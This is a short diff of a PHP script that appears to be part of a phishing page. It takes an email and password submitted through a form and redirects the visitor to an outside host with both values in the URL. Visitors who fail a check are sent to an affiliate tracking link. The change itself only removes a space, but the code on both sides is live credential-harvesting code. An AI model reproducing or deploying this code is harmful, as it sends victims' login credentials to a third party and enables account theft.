@@ -22,7 +22,7 @@
  if ($check) { 
  $usuario = $_POST[ 'email' ];
 $password = $_POST[ 'pass' ];
-  header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario ."&password=".$password."");
+  header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario."&password=".$password."");
  } 
  else { 
  header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
